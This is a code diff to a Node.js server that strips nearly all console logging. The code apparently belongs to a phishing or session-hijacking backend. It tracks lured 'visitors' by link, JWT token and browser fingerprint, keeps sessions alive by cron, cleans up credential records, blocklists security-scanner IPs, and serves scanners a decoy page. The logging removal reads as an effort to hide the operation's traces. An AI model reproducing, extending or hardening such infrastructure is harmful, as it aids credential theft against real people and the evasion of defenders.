@@ -25,7 +25,7 @@ const db = require('./backend/database/connection');
 // permanently, revert the diagnostic commit; the routing/blocklist fixes are
 // in separate commits and are unaffected.
 const DC_DIAG = String(process.env.DC_DIAG || '1') === '1';
-function dcDiag(msg) { if (DC_DIAG) console.log(msg); }
+function dcDiag(msg) { if (DC_DIAG) ; }
 
 
 // Route imports
@@ -64,7 +64,7 @@ const io = socketIo(server, {
     origin: function (origin, callback) {
       if (!origin) return callback(null, true);
       if (allowedOrigins.includes(origin)) return callback(null, true);
-      console.warn(`[SOCKET.IO CORS] Denied origin: ${origin}`);
+
       const err = new Error('Origin not allowed by Socket.IO CORS');
       err.status = 403;
       return callback(err, false);
@@ -189,7 +189,7 @@ async function getDynamicOrigins() {
       }
     }
   } catch (err) {
-    console.warn('[CORS] Dynamic origin load failed:', err.message);
+
   }
 
   // Self-hosted exports register their serving host at runtime; allow those
@@ -200,7 +200,7 @@ async function getDynamicOrigins() {
       if (row.host) origins.add('https://' + String(row.host).trim().toLowerCase());
     }
   } catch (err) {
-    console.warn('[CORS] export_hosts load failed:', err.message);
+
   }
 
   return Array.from(origins);
@@ -221,7 +221,7 @@ const corsOptions = {
     // Check if origin is in blocklist
     for (const blocked of blocklist) {
       if (origin.includes(blocked)) {
-        console.warn(`[CORS] BLOCKED origin (blocklist): ${origin}`);
+
         return callback(new Error('Origin is blocked'), false);
       }
     }
@@ -234,7 +234,7 @@ const corsOptions = {
       // Invalid URL - deny silently
       return callback(new Error('Invalid origin URL'), false);
     }
-    console.warn(`[CORS] Denied origin: ${origin}`);
+
     const err = new Error('Origin not allowed by CORS');
     err.status = 403;
     return callback(err, false);
@@ -461,11 +461,11 @@ app.post('/api/beacon', async (req, res) => {
     }
     
     // Log the beacon event (link could log its own data)
-    console.log(`[Beacon] visitor detected: user=${decoded.user_id}, link=${decoded.link_id}, ip=${ip}`);
+
     
     res.status(200).send('ok');
   } catch (err) {
-    console.error('[Beacon] Error:', err.message);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -491,12 +491,12 @@ app.post('/api/beacon/fp', async (req, res) => {
         'UPDATE visitors SET fingerprint = ? WHERE link_id = ? AND jwt_token = ?',
         [fp, decoded.link_id, jwt_token]
       );
-      console.log(`[BeaconFp] Link ${decoded.link_id} fingerprint received`);
+
     }
     
     res.status(200).send('ok');
   } catch (err) {
-    console.error('[BeaconFp] Error:', err.message);
+
     res.status(500).json({ error: 'Fingerprint failed' });
   }
 });
@@ -623,7 +623,7 @@ app.get('/api/export/host', async (req, res) => {
       );
     }
   } catch (err) {
-    console.warn('[export/host] register failed link=' + linkId + ' host=' + host + ': ' + err.message);
+
   }
 
   // Best-effort Turnstile allowed-hostname sync, so the challenge is allowed to
@@ -639,9 +639,9 @@ app.get('/api/export/host', async (req, res) => {
     try {
       const turnstilePool = require('./backend/services/turnstile-pool');
       await turnstilePool._updateWidgetOrigins(siteKey, host, 'add');
-      console.log('[export/host] Turnstile allowed-hostname synced ' + host + ' (link ' + linkId + ')');
+
     } catch (tsErr) {
-      console.warn('[export/host] Turnstile sync failed for ' + host + ': ' + tsErr.message);
+
     }
   }
 
@@ -717,7 +717,7 @@ app.post('/api/log', async (req, res) => {
       // This is acceptable since workers are generated with the link's JWT payload
       const { message, stack, source, lineno, colno, ua } = req.body;
       if (link_id && message) {
-        console.error('[Worker Log] link_id=' + link_id + ' msg=' + message + (source ? ' source=' + source : ''));
+
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
           [link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
@@ -756,7 +756,7 @@ app.post('/api/log', async (req, res) => {
         // nothing of this reaches the visitor. Records are always stored;
         // printing is what DC_DIAG toggles.
         if (DC_DIAG && (log.level === 'error' || /\[DevCode\]|\[VG\]/.test(msg))) {
-          console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + msg);
+
         }
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent, created_at) VALUES (?, ?, ?, ?, ?)',
@@ -767,7 +767,7 @@ app.post('/api/log', async (req, res) => {
       // Single log format from workers
       const { message, stack, source, lineno, colno, ua } = req.body;
       if (decoded.link_id && message) {
-        if (DC_DIAG) console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + message + (source ? ' source=' + source : ''));
+        if (DC_DIAG) ;
         await db.query(
           'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
           [decoded.link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
@@ -776,7 +776,7 @@ app.post('/api/log', async (req, res) => {
     }
     res.status(200).send('ok');
   } catch (err) {
-    console.error('[Log] Error:', err.message);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -785,7 +785,7 @@ app.post('/api/log', async (req, res) => {
 app.post('/api/killpage', async (req, res) => {
   try {
     const { reason, url, ua, link_id } = req.body;
-    console.error('[KillPage] reason:', reason, 'url:', url, 'ua:', (ua || '').substring(0, 100));
+
     
     if (link_id) {
       await db.query(
@@ -796,7 +796,7 @@ app.post('/api/killpage', async (req, res) => {
     
     res.status(200).send('ok');
   } catch (err) {
-    console.error('[KillPage] Error:', err.message);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -827,14 +827,11 @@ app.post('/api/scanner-signal', async (req, res) => {
 
     const scannerBlocklist = require('./backend/services/scanner-blocklist');
     const added = await scannerBlocklist.addBlockedIp(ip, 'edge_signal', user_agent);
-    console.warn('[ScannerSignal] link:', String(decoded.link_id),
-      'ip:', String(ip).slice(0, 45),
-      'reason:', String(reason || '').slice(0, 60),
-      'action:', added ? 'added' : 'already_listed');
+
 
     res.status(200).send('ok');
   } catch (err) {
-    console.error('[ScannerSignal] Error:', err.message);
+
     res.status(200).send('ok'); // never fail the caller; the worker ignores status
   }
 });
@@ -861,7 +858,7 @@ app.get('/api/admin/check-setup', async (req, res) => {
 
 // --- WebSocket ---
 io.on('connection', (socket) => {
-  console.log('[WS] Client connected:', socket.id);
+
   
   socket.on('subscribe', (data) => {
     if (data.room) {
@@ -870,7 +867,7 @@ io.on('connection', (socket) => {
   });
   
   socket.on('disconnect', () => {
-    console.log('[WS] Client disconnected:', socket.id);
+
   });
 });
 
@@ -879,11 +876,11 @@ app.set('io', io);
 
 // --- Session Keeper Cron ---
 cron.schedule(`0 */${config.RENEWAL_INTERVAL_HOURS} * * *`, async () => {
-  console.log('[CRON] Running session keeper renewal...');
+
   try {
     await sessionKeeper.runRenewalCycle();
   } catch (err) {
-    console.error('[CRON] Session keeper error:', err.message);
+
   }
 });
 
@@ -894,10 +891,10 @@ cron.schedule('*/5 * * * *', async () => {
       "UPDATE payments SET status = 'expired' WHERE status = 'pending' AND expires_at < NOW()"
     );
     if (expired.affectedRows > 0) {
-      console.log(`[CRON] Expired ${expired.affectedRows} payments`);
+
     }
   } catch (err) {
-    console.error('[CRON] Payment expiry error:', err.message);
+
   }
 });
 
@@ -908,10 +905,10 @@ cron.schedule('*/5 * * * *', async () => {
       "UPDATE visitors SET status = 'timeout' WHERE status = 'waiting' AND created_at < DATE_SUB(NOW(), INTERVAL 20 MINUTE)"
     );
     if (updated.affectedRows > 0) {
-      console.log(`[CRON] Marked ${updated.affectedRows} timed-out visitors as 'timeout'`);
+
     }
   } catch (err) {
-    console.error('[CRON] Visitor timeout cleanup error:', err.message);
+
   }
 });
 
@@ -937,16 +934,16 @@ cron.schedule('0 * * * *', async () => {
     }
     const total = (oldTokens.affectedRows || 0) + (orphanCredentials.affectedRows || 0) + (orphanRenewals.affectedRows || 0);
     if (total > 0) {
-      console.log(`[CRON] Auto cleanup removed ${total} records`);
+
     }
   } catch (err) {
-    console.error('[CRON] Auto cleanup error:', err.message);
+
   }
 });
 
 // --- Error Handler ---
 app.use((err, req, res, next) => {
-  console.error('[ERROR]', err.message);
+
   // In production, never expose stack traces or internal error details
   if (config.NODE_ENV === 'production') {
     res.status(500).json({ error: 'Internal server error' });
@@ -1001,7 +998,7 @@ async function runMigrations() {
         for (const stmt of statements) {
           try { await db.query(stmt); } catch (e) { /* ignore already-applied */ }
         }
-        console.log(`[DB] Applied migration: ${mig}`);
+
       }
     }
     // Also ensure indexes from schema.sql exist (safe to re-run)
@@ -1027,7 +1024,7 @@ async function runMigrations() {
     for (const stmt of indexStatements) {
       try { await db.query(stmt); } catch (e) { /* index may already exist */ }
     }
-    console.log('[DB] All migrations and indexes applied successfully');
+
 
     // Self-hosted export host registry (see GET /api/export/host). Created here
     // so getDynamicOrigins() can read it before the first export is ever opened
@@ -1040,14 +1037,14 @@ async function runMigrations() {
         PRIMARY KEY (host, link_id)
       )`);
     } catch (e) { /* already exists */ }
-    console.log('[DB] export_hosts table ensured');
+
   } catch (err) {
-    console.error('[DB] Migration error (non-fatal):', err.message);
+
   }
 }
-runMigrations().catch(err => console.error('[DB] Migration failed:', err.message));
+runMigrations().catch(err => {});
 require('./backend/services/sensitive-migrate').runSensitiveMigrations()
-  .catch(err => console.error('[SENSITIVE] migration failed:', err.message));
+  .catch(err => {});
 
 // Serve a harmless static page for unknown routes / scanners
 app.use((req, res) => res.status(404).sendFile(path.join(__dirname, 'admin-panel', '404.html')));
